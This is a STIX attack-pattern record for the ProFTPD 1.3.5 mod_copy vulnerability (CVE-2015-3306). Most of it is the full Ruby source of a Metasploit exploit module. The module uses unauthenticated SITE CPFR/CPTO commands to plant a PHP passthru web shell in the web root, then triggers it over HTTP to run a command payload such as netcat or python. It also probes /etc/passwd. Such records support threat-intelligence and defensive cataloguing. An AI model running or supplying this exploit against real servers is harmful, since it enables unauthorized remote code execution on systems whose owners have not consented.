{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--463542ca-9303-4b3e-977e-9591d8700999",
    "created": "2024-08-14T17:14:32.633421Z",
    "modified": "2024-08-14T17:14:32.633425Z",
    "name": "ProFTPD 1.3.5 Mod_Copy Command Execution",
    "description": " This module exploits the SITE CPFR/CPTO mod_copy commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the 'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/ftp/proftpd_modcopy_exec.rb",
            "external_id": "proftpd_modcopy_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3306"
        },
        {
            "source_name": "reference",
            "url": "http://bugs.proftpd.org/show_bug.cgi?id=4169"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ProFTPD 1.3.5 Mod_Copy Command Execution',\n        'Description' => %q{\n          This module exploits the SITE CPFR/CPTO mod_copy commands in ProFTPD version 1.3.5.\n          Any unauthenticated client can leverage these commands to copy files from any\n          part of the filesystem to a chosen destination. The copy commands are executed with\n          the rights of the ProFTPD service, which by default runs under the privileges of the\n          'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website\n          directory, PHP remote code execution is made possible.\n        },\n        'Author' => [\n          'Vadim Melihow', # Original discovery, Proof of Concept\n          'xistence <xistence[at]0x90.nl>' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2015-3306' ],\n          [ 'EDB', '36742' ],\n          [ 'URL', 'http://bugs.proftpd.org/show_bug.cgi?id=4169' ]\n        ],\n        'Privileged' => false,\n        'Platform' => [ 'unix' ],\n        'Arch' => ARCH_CMD,\n        'Payload' => {\n          'BadChars' => '',\n          'Compat' => {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'generic gawk python perl netcat'\n          }\n        },\n        'Targets' => [\n          [ 'ProFTPD 1.3.5', {} ]\n        ],\n        'DisclosureDate' => '2015-04-22',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptPort.new('RPORT', [true, 'HTTP port', 80]),\n      OptPort.new('RPORT_FTP', [true, 'FTP port', 21]),\n      OptString.new('TARGETURI', [true, 'Base path to the website', '/']),\n      OptString.new('TMPPATH', [true, 'Absolute writable path', '/tmp']),\n      OptString.new('SITEPATH', [true, 'Absolute writable website path', '/var/www'])\n    ])\n  end\n\n  def ftp_port\n    datastore['RPORT_FTP']\n  end\n\n  def check\n    sock = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => ftp_port)\n\n    if sock.nil?\n      return CheckCode::Unknown(\"#{rhost}:#{ftp_port} - Failed to connect to FTP server\")\n    end\n\n    vprint_status(\"#{rhost}:#{ftp_port} - Connected to FTP server\")\n\n    # Set 30 second timeout to allow remote server time to perform reverse DNS lookup\n    res = sock.get_once(-1, 30)\n\n    unless res && res.include?('220')\n      return CheckCode::Safe(\"#{rhost}:#{ftp_port} - Failure retrieving ProFTPD 220 OK banner\")\n    end\n\n    sock.puts(\"SITE CPFR /etc/passwd\\r\\n\")\n    res = sock.get_once(-1, 10)\n\n    if res.nil?\n      return CheckCode::Unknown(\"#{rhost}:#{ftp_port} - Failed to connect to FTP server\")\n    end\n\n    if res.include?(\"500 'SITE CPFR' not understood\")\n      return CheckCode::Safe(\"#{rhost}:#{ftp_port} - SITE CPFR command not supported\")\n    end\n\n    if res.include?('530')\n      return CheckCode::Safe(\"#{rhost}:#{ftp_port} - SITE CPFR command requires authentication.\")\n    end\n\n    if res.include?('350')\n      return CheckCode::Appears(\"#{rhost}:#{ftp_port} - Unauthenticated SITE CPFR command was successful\")\n    end\n\n    CheckCode::Safe\n  ensure\n    sock.close unless sock.nil?\n  end\n\n  def exploit\n    get_arg = rand_text_alphanumeric(5..7)\n    payload_name = rand_text_alphanumeric(5..7) + '.php'\n\n    sock = Rex::Socket.create_tcp('PeerHost' => rhost, 'PeerPort' => ftp_port)\n\n    if sock.nil?\n      fail_with(Failure::Unreachable, \"#{rhost}:#{ftp_port} - Failed to connect to FTP server\")\n    end\n\n    print_status(\"#{rhost}:#{ftp_port} - Connected to FTP server\")\n\n    # Set 30 second timeout to allow remote server time to perform reverse DNS lookup\n    res = sock.get_once(-1, 30)\n    unless res && res.include?('220')\n      fail_with(Failure::Unknown, \"#{rhost}:#{ftp_port} - Failure retrieving ProFTPD 220 OK banner\")\n    end\n\n    print_status(\"#{rhost}:#{ftp_port} - Sending copy commands to FTP server\")\n\n    sock.puts(\"SITE CPFR /proc/self/cmdline\\r\\n\")\n    res = sock.get_once(-1, 10)\n    unless res && res.include?('350')\n      fail_with(Failure::Unknown, \"#{rhost}:#{ftp_port} - Failure copying from /proc/self/cmdline\")\n    end\n\n    sock.put(\"SITE CPTO #{datastore['TMPPATH']}/.<?php passthru($_GET[\\'#{get_arg}\\']);?>\\r\\n\")\n    res = sock.get_once(-1, 10)\n    unless res && res.include?('250')\n      fail_with(Failure::Unknown, \"#{rhost}:#{ftp_port} - Failure copying to temporary payload file\")\n    end\n\n    sock.put(\"SITE CPFR #{datastore['TMPPATH']}/.<?php passthru($_GET[\\'#{get_arg}\\']);?>\\r\\n\")\n    res = sock.get_once(-1, 10)\n    unless res && res.include?('350')\n      fail_with(Failure::Unknown, \"#{rhost}:#{ftp_port} - Failure copying from temporary payload file\")\n    end\n\n    sock.put(\"SITE CPTO #{datastore['SITEPATH']}/#{payload_name}\\r\\n\")\n    res = sock.get_once(-1, 10)\n    unless res && res.include?('250')\n      fail_with(Failure::Unknown, \"#{rhost}:#{ftp_port} - Failure copying PHP payload to website path, directory not writable?\")\n    end\n\n    sock.close\n\n    register_file_for_cleanup(\"#{datastore['SITEPATH']}/#{payload_name}\")\n\n    uri = normalize_uri(target_uri.path, payload_name)\n    print_status(\"Executing PHP payload #{uri}\")\n    res = send_request_cgi!(\n      'uri' => uri,\n      'vars_get' => { get_arg => \"nohup #{payload.encoded} &\" }\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{rhost}:#{ftp_port} - Failure executing payload\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-04-22",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}